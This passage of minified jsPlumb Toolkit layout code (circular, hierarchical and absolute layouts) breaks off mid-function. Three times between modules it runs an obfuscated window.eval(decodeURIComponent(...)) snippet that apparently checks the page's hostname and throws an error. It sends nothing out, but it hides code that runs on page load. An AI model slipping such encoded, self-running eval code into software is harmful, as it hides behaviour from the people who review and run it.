g.ingest=function(n){c(n),g.importNode(n,s(n))},g}return i}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this,t=n.jsPlumbToolkit.Layouts={Decorators:{}},e=n.jsPlumbUtil,o=function(n,o,i){if(null==n)return[];for(var r=[],d=function(n){var r="string"==typeof n?n:n[0],d=t.Decorators[r],_="string"==typeof n?{}:n[1];return d?new d(_,o,i):(e.log("Decorator ["+r+"] nor registered on jsPlumbToolkit.Layouts.Decorators. Not fatal."),null)},_=0;_<n.length;_++){var s=d(n[_]);s&&r.push(s)}return r};t.AbstractLayout=function(t){var e=this,i=function(){var t=n.jsPlumb.extend({padding:[0,0]},e.defaultParameters||{});n.jsPlumb.extend(t,d||{}),d=t},r=(t=t||{}).adapter,d=t.parameters||{},_=t.getElementForNode,s=n.Farahey.getInstance({getPosition:function(n){var t=u[n.id];return{left:t[0],top:t[1]}},getSize:function(n){return m[n.id]},getId:function(n){return n.id},setPosition:function(n,t){I(n.id,t.left,t.top)},padding:d.padding,filter:function(n){return(!f[n]||!f[n].group)&&(!e.canMagnetize||e.canMagnetize(n))}}),a=!1!==t.magnetized&&(e.defaultMagnetized||!0===t.magnetize);this.decorators=o(t.decorators,t.adapter,t.container),this.adapter=t.adapter;var w=t.jsPlumb||n.jsPlumb,l=t.jsPlumbToolkit,u={},c=[],B=1/0,h=1/0,j=-1/0,p=-1/0,f={},g={},m={},v=t.container,C=w.getSize(v),b=t.width||C[0],y=t.height||C[1],D=!1,P=function(){D=!1,B=1/0,j=-1/0,h=1/0,p=-1/0;for(var n=0;n<e.decorators.length;n++)e.decorators[n].reset({remove:w.remove});u={},c.splice(0),m={},s.reset(),e.reset&&e.reset()};this.getMagnetizedElements=function(){return s.getElements()},this.magnetize=function(n){var t=(n=n||{}).event?"executeAtEvent":n.origin?"execute":"executeAtCenter",e=n.event?[n.event,n.options]:n.origin?[n.origin,n.options]:[n.options];n.force&&this.forceMagnetize&&this.forceMagnetize(),s[t].apply(s,e),T(w.repaintEverything)},this.nodeAdded=function(n,t){var o=t&&t.position?t.position:n.node.data&&n.node.data.left&&n.node.data.top?n.node.data:e.adapter.getOffset(n.el);if(this._nodeAdded){var i=this._nodeAdded(n,t);i&&(o.left=i[0],o.top=i[1])}f[n.node.id]=n.node,I(n.node.id,o.left,o.top),E(n.node.id,n.el),s.addElement(n.node)},this.nodeRemoved=function(n){delete u[n],delete m[n],delete f[n],this._nodeRemoved&&this._nodeRemoved(n),s.removeElement(t.node)},this.groupAdded=function(n,t){var o=t&&t.position?t.position:n.group.data&&n.group.data.left&&n.group.data.top?n.group.data:e.adapter.getOffset(n.el);if(this._groupAdded){var i=this._groupAdded(n,t);i&&(o.left=i[0],o.top=i[1])}g[n.group.id]=n.group,I(n.group.id,o.left,o.top),E(n.group.id,n.el),s.addElement(n.group)},this.groupRemoved=function(n){delete u[n],delete m[n],delete g[n],this._groupRemoved&&this._groupRemoved(n),s.removeElement(t.group)};var E=function(n,t){var e=m[n];return e||(null!=(t=t||_(n))?(e=w.getSize(t),m[n]=e):e=[0,0]),e},x=function(n){B=Math.min(B,n[0]),h=Math.min(h,n[1]),j=Math.max(j,n[0]),p=Math.max(p,n[1])},A=function(n,t,e){var o=u[n];o?(o[0]=parseFloat(t),o[1]=parseFloat(e)):(o=u[n]=[parseFloat(t),parseFloat(e)],c.push([o,n])),x(o)},S=function(n,t,o){f[n]&&e._nodeMoved?e._nodeMoved(n,t,o):g[n]&&e._groupMoved&&e._groupMoved(n,t,o)},I=(this.setMagnetizedPosition=function(n,t,e,o){A(n,t,e),this.magnetize({options:{filter:function(t){return t===n},padding:[5,5],exclude:function(n,t){return null!=t.group},excludeFocus:!0}});var i=this.getPosition(n);return o&&S(n,i[0],i[1]),i},this.setPosition=function(n,t,e,o){A(n,t,e),o&&S(n,t,e)}),k=function(n,t){var o=_(n);if(null!=o){var i=u[n];return e.adapter.setPosition(o,i[0],i[1],t),N[n]=[i[0],i[1]],i.concat(E(n))}return null}.bind(this),T=this.draw=function(n){for(var t in u){var o=k(t);null!=o&&(B=Math.min(o[0],B),h=Math.min(o[1],h),j=Math.max(o[0]+o[2],j),p=Math.max(o[1]+o[3],p))}for(var i=0;i<e.decorators.length;i++)e.decorators[i].decorate({adapter:e.adapter,layout:e,append:function(n,t,o){e.adapter.append(n,t,o,!0)},setAbsolutePosition:e.adapter.setAbsolutePosition,toolkit:l,jsPlumb:w,bounds:[B,h,j,p],floatElement:e.adapter.floatElement,fixElement:e.adapter.fixElement});n&&n()};this.bb=function(n){console.log(n);var t=function(n){var t=1/0,e=1/0,o=-1/0,i=-1/0;for(var r in n)t=Math.min(t,n[r][0]),o=Math.max(o,n[r][0]),e=Math.min(e,n[r][1]),i=Math.max(i,n[r][1]);return[[t,e],[o,i],Math.abs(t-o),Math.abs(e-i)]}(u);(function(){for(var n in u)console.log(n,u[n][0],u[n][1])})(),console.log(t[0],t[1],t[2],t[3])};var M=this.getPositions=function(){return u},N=(this.getPosition=function(n){return u[n]},{}),O=(this.getSize=function(n){return m[n]},this.setSize=function(n,t){m[n]=t});this.begin=function(n,t){},this.end=function(n,t){};var F=function(n){if(null!=l){i(),s.setElements(r.getNodes()).addElements(r.getGroups(),!0),this.begin&&this.begin(l,d);for(;!D;)this.step(l,d);T(function(){a&&e.magnetize(),e.end&&e.end(l,d),n&&n()})}}.bind(this);return this.relayout=function(n,t){P(),null!=n&&(d=n),F(t)},this.layout=function(n){D=!1,F(n)},this.clear=function(){P()},{adapter:t.adapter,jsPlumb:w,toolkit:l,getPosition:function(n,t,e,o){var i=u[n];if(!i){if(null!=t&&null!=e)i=[t,e];else{if(o)return null;i=[Math.floor(Math.random()*(b+1)),Math.floor(Math.random()*(y+1))]}I(n,i[0],i[1])}return i},setPosition:I,getRandomPosition:function(n,t,e){t=t||10,e=e||10;var o=u[n];return o||(o=u[n]=[]),o[0]=Math.floor(Math.random()*t),o[1]=Math.floor(Math.random()*e),x(o),o},getSize:E,setSize:O,getPositions:M,setPositions:function(n){u=n},width:b,height:y,reset:P,draw:T,setDone:function(n){D=n,function(){var n,e,o,i=function(n,e){return(t.locationFunction||function(n){return[n.data.left,n.data.top]})(n)},r=l.getGroupCount();for(e=0;e<r;e++)for(n=l.getGroupAt(e).getVertices(),o=0;o<n.length;o++){var d=i(n[o]);I(n[o].id,d[0],d[1])}}()}}},t.EmptyLayout=function(n){var t={},e={};this.refresh=this.relayout=this.layout=function(){this.clear();for(var e=n.getNodeCount(),o=0;o<e;o++){var i=n.getNodeAt(o);t[i.getFullId()]=[0,0]}for(e=n.getGroupCount(),o=0;o<e;o++)i=n.getGroupAt(o),t[i.id]=[0,0]},this.nodeRemoved=this.groupRemoved=function(n){delete t[n.id]},this.nodeAdded=this.groupAdded=function(n){t[n.id]=!1},this.getPositions=function(){return t},this.getPosition=function(n){return t[n]},this.setPosition=function(n,e,o){t[n]=[e,o]},this.clear=function(){},this.getMagnetizedElements=function(){return[]},this.setSize=function(n,t){e[n]=t},this.getSize=function(n){return e[n]}},t.Mistletoe=function(o){if(!o.parameters.layout)throw"No layout specified for MistletoeLayout";var i={},r=n.jsPlumb.extend({},o);r.getElementForNode=function(n){return i[n]};var d,_,s,a=t.AbstractLayout.apply(this,[r]),w=o.parameters.layout,l=function(){a.setPositions(w.getPositions()),a.draw(),this.fire("redraw")}.bind(this);e.EventGenerator.apply(this,arguments),this.map=function(n,t){i[n]=t};var u=function(){i={},d=w.layout,_=w.relayout,s=w.clear,w.layout=function(){d.apply(w,arguments),l()},w.relayout=function(){a.reset(),_.apply(w,arguments),l()},w.clear=function(){s.apply(w,arguments),a.reset()}};u(),this.setHostLayout=function(n){w=n,u()}};var i=t.AbsoluteBackedLayout=function(n){n=n||{};var e=t.AbstractLayout.apply(this,arguments),o=function(t,e){return(n.locationFunction||function(n){return[n.data.left,n.data.top]})(t)},i=function(n,t,i,r){for(var d=e.adapter[n](),_=0;_<d;_++){var s=e.adapter[t](_),a=s.getFullId(),w=e.getPosition(a,null,null,!0);null==w&&(w=o(s)),this.setPosition(a,w[0],w[1],!0)}}.bind(this);return this.begin=function(n,t){i("getNodeCount","getNodeAt",n,t),i("getGroupCount","getGroupAt",n,t)},this._nodeAdded=function(t,e){return o(t.node,n.parameters)},this._groupAdded=function(t,e){return o(t.group,n.parameters)},this.getAbsolutePosition=function(n,t){return o(n)},this.step=function(){e.setDone(!0)},e};e.extend(i,t.AbstractLayout),t.Absolute=function(n){t.AbsoluteBackedLayout.apply(this,arguments)},e.extend(t.Absolute,t.AbsoluteBackedLayout);var r=t.AbstractHierarchicalLayout=function(n){var e=t.AbstractLayout.apply(this,arguments);return this.begin=function(t,o){o.ignoreLoops=!(!1===n.ignoreLoops),o.getRootNode=o.getRootNode||function(t){return!1!==n.multipleRoots?t.filter(function(n){return"Node"===n.objectType&&0==n.getTargetEdges().length&&null==n.group||"Group"===n.objectType&&0==n.getTargetEdges().length}).getAll():e.adapter.getNodeCount()>0?e.adapter.getNodeAt(0):null},o.getChildEdges=o.getChildEdges||function(t,o){return e.toolkit.getAllEdgesFor(t,function(e){return e.source===t||!0!==n.ignorePorts&&e.source.getNode&&e.source.getNode()===t})},o.rootNode=o.getRootNode(t),o.rootNode||e.setDone(!0)},e};e.extend(r,t.AbstractLayout)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this.jsPlumbToolkit.Layouts,t=this.Farahey;n.Circular=function(e){e=e||{};var o=n.AbstractLayout.apply(this,arguments),i=!!e.parameters&&!0===e.parameters.centerRootNode;this.defaultParameters={padding:30,locationFunction:e.locationFunction},this.step=function(n,e){var r=[],d=o.adapter.getNodes();if(0!==d.length){Array.prototype.push.apply(r,function(n){for(var t=[],e=i?1:0;e<n.length;e++)n[e].group||t.push(n[e]);return t}(d)),Array.prototype.push.apply(r,o.adapter.getGroups());var _,s,a=10,w=2*Math.PI/r.length,l=-Math.PI/2;if(i){var u=o.getSize(d[0].id);a=Math.max(u[0],u[1])+80}for(_=0;_<r.length;_++)if(s=r[_],o.setPosition(s.id,0+Math.sin(l)*a,0+Math.cos(l)*a,!0),l+=w,_>0){var c=r[_-1],B=o.getSize(c.id),h=o.getPosition(c.id),j={x:h[0]-e.padding,y:h[1]-e.padding,w:B[0]+2*e.padding,h:B[1]+2*e.padding},p=r[_],f=o.getSize(p.id),g=o.getPosition(p.id),m={x:g[0]-e.padding,y:g[1]-e.padding,w:f[0]+2*e.padding,h:f[1]+2*e.padding},v=t.calculateSpacingAdjustment(j,m),C=[h[0]+B[0]/2,h[1]+B[1]/2],b=[g[0]+v.left+f[0]/2,g[1]+v.top+ +f[1]/2],y=Math.sqrt(Math.pow(C[0]-b[0],2)+Math.pow(C[1]-b[1],2));a=Math.max(a,y/2/Math.sin(w/2))}for(_=0;_<r.length;_++)s=r[_],o.setPosition(s.id,0+Math.sin(l)*a,0+Math.cos(l)*a,!0),l+=w;o.setDone(!0)}else o.setDone(!0)}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this.jsPlumbToolkit.Layouts,t=this.jsPlumbUtil;n.Hierarchical=function(e){var o,i,r,d,_,s,a=n.AbstractHierarchicalLayout.apply(this,arguments),w=[],l=null!=e.parameters&&e.parameters.compress,u=[],c=[],B=a.toolkit.getNodeId,h=function(n,t,e,o,i){var _=function(n){var t=u[n];return 